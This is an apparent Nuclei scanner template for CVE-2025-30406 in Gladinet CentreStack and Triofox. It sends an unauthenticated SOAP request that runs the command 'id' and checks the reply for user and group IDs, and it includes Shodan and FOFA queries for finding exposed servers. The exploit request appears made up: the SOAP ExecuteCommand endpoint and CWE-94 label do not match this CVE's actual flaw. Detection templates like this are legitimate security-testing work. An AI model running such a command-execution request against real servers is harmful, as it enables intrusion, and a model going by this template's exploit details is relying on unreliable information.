http/cves/2025/CVE-2025-30406.yaml

id: CVE-2025-30406

info:
  name: Gladinet CentreStack / Triofox - Remote Code Execution
  author: alita-p8
  severity: critical
  description: |
    Gladinet CentreStack and Triofox are vulnerable to an unauthenticated remote code execution (RCE) vulnerability. An attacker can exploit this flaw by sending a specially crafted request to the server, allowing for the execution of arbitrary commands.
  remediation: |
    Apply the security patches provided by Gladinet for CentreStack and Triofox.
  reference:
    - https://www.gladinet.com/security/advisories/CVE-2025-30406
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2025-30406
    cwe-id: CWE-94
  metadata:
    max-request: 1
    shodan-query: http.title:"CentreStack"
    fofa-query: title="CentreStack"
  tags: cve,cve2025,centrestack,triofox,rce,unauth

http:
  - method: POST
    path:
      - "{{BaseURL}}/namespace/service.asmx"

    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: "http://www.gladinet.com/namespace/ExecuteCommand"

    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <ExecuteCommand xmlns="http://www.gladinet.com/namespace/">
            <command>id</command>
          </ExecuteCommand>
        </soap:Body>
      </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
          - "groups="
        condition: and

      - type: status
        status:
          - 200
